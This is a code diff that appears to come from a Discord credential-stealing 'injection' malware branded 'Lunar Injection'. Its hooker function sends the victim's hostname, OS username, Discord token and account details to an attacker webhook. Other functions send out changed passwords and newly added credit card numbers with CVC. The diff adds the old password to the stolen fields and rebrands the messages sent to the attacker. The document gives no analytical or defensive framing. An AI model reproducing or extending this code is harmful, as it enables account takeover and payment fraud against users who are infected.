@@ -147,8 +147,8 @@ const request = async (method, url, headers, data) => {
 
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "Lunar Gang";
-    content["avatar_url"] = "https://cdn.discordapp.com/attachments/1438563954627444817/1439768810084106320/lunargang.png";
+    content["username"] = "Lunar Injection ";
+    content["avatar_url"] = "https://media.discordapp.net/attachments/1438563954627444817/1439768810084106320/lunargang.png?ex=691c6171&is=691b0ff1&hm=211e1d65b25b0ca2d8a1748d0818f33849213d30782bf5895faed71221a87167&=&format=webp&quality=lossless&width=896&height=896";
     content["embeds"][0]["author"] = {
         "name": account.username,
     };
@@ -156,8 +156,8 @@ const hooker = async (content, token, account) => {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "Lunar Gang",
-        "icon_url": "https://cdn.discordapp.com/attachments/1438563954627444817/1439768810084106320/lunargang.png",
+        "text": "Lunar Injection",
+        "icon_url": "https://media.discordapp.net/attachments/1438563954627444817/1439768810084106320/lunargang.png?ex=691c6171&is=691b0ff1&hm=211e1d65b25b0ca2d8a1748d0818f33849213d30782bf5895faed71221a87167&=&format=webp&quality=lossless&width=896&height=896",
     };
     content["embeds"][0]["title"] = "Account Information";
 
@@ -220,87 +220,18 @@ const fetchFriends = async token => await fetch("/relationships", {
     "Authorization": token
 });
 
-async function getNitro(flags, id, token) {
+const getNitro = flags => {
     switch (flags) {
         case 1:
-            return "<:946246402105819216:962747802797113365>";
+            return '`Nitro Classic`';
         case 2:
-            let info;
-            await axios.get(`https://discord.com/api/v9/users/${account.id}/profile`, {
-                headers: {
-                    "Content-Type": "application/json",
-                    "authorization": token
-                }
-            }).then(res => { info = res.data })
-                .catch(() => { })
-            if (!info) return "<:946246402105819216:962747802797113365>";
-
-            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";
-
-            let boost = ["<:lvl1:1219031125247266887>", "<:lvl2:1219031171942449282>", "<:lvl3:1219031999847858216>", "<:lvl4:1219031250950684763>", "<:lvl5:1219031294176919603>", "<:lvl6:1219031344324022425>", "<:lvl7:1219031400607645816>", "<:lvl8:1219031431280332910>", "<:lvl9:1219031069974724638>"]
-            var i = 0
-
-            try {
-                let d = new Date(info.premium_guild_since)
-                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
-                let d1 = new Date(info.premium_guild_since)
-                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
-                let d2 = new Date(info.premium_guild_since)
-                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
-                let d3 = new Date(info.premium_guild_since)
-                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
-                let d4 = new Date(info.premium_guild_since)
-                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
-                let d5 = new Date(info.premium_guild_since)
-                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
-                let d6 = new Date(info.premium_guild_since)
-                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
-                let d7 = new Date(info.premium_guild_since)
-                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)
-
-                if (boost2month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost3month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost6month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost9month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost12month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost15month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost18month > 0) {
-                    i += 0
-                } else {
-                    i += 1
-                } if (boost24month > 0) {
-                    i += 0
-                } else if (boost24month < 0 || boost24month == 0) {
-                    i += 1
-                } else {
-                    i = 0
-                }
-            } catch {
-                i += 0
-            }
-            return `<:946246402105819216:962747802797113365> ${boost[i]}`
+            return '`Nitro Boost`';
+        case 3:
+            return '`Nitro Basic`';
         default:
-            return "\`No Nitro\`";
-    };
-}
+            return '`❌`';
+    }
+};
 
 const getBadges = flags => {
     let badges = '';
@@ -367,12 +298,12 @@ const getServers = async token => {
     let rareGuilds = "";
     for (const guild of filteredGuilds) {
         if (rareGuilds === "") {
-            rareGuilds += `**UHQ Servers:**\n`;
+            rareGuilds += `**Rare Servers:**\n`;
         }
         rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
     }
 
-    rareGuilds = rareGuilds || "**No UHQ Servers**";
+    rareGuilds = rareGuilds || "**No Rare Servers**";
 
     return {
         message: rareGuilds,
@@ -447,6 +378,10 @@ const PasswordChanged = async (newPassword, oldPassword, token) => {
                 "name": "New Password",
                 "value": "`" + newPassword + "`",
                 "inline": true
+            }, {
+                "name": "Old Password",
+                "value": "`" + oldPassword + "`",
+                "inline": true
             }]
         }]
     };
@@ -458,7 +393,7 @@ const CreditCardAdded = async (number, cvc, month, year, token) => {
     const account = await fetchAccount(token)
 
     const content = {
-        "content": `**${account.username}** just added a credit card! 💳`,
+        "content": `**${account.username}** just added a credit card!`,
         "embeds": [{
             "fields": [{
                 "name": "Number",
@@ -530,7 +465,7 @@ async function initiation() {
         const account = await fetchAccount(token)
 
         const content = {
-            "content": `**${account.username}** Injection worked`,
+            "content": `**${account.username}** just got injected!`,
 
             "embeds": [{
                 "fields": [{
